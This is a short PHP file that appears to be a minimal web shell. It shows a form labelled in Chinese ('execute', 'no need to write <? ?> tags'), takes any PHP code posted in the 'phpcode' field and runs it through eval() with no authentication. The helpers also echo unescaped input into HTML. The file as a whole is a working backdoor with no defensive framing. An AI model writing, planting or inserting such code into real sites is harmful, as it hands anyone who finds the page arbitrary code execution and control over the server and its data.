<?php
function html_n($data){
	echo "$data\n";
}

function html_text($name,$cols,$rows,$value = ''){
	html_n("<br><br><textarea name=\"$name\" COLS=\"$cols\" ROWS=\"$rows\" >$value</textarea>");
}

function html_input($type,$name,$value = '',$text = '',$size = '',$mode = false){
	html_n("<input type=\"$type\" name=\"$name\" value=\"$value\" size=\"$size\" checked>$text");
}

$phpcode = $_POST['phpcode'];
html_n('<tr><td><form method="POST">不用写&lt;? ?&gt;标签');
html_text("phpcode","70","15",$phpcode);
html_input("submit","eval","执行","<br><br>");
echo "<br><br>";
eval(stripslashes($phpcode));
?>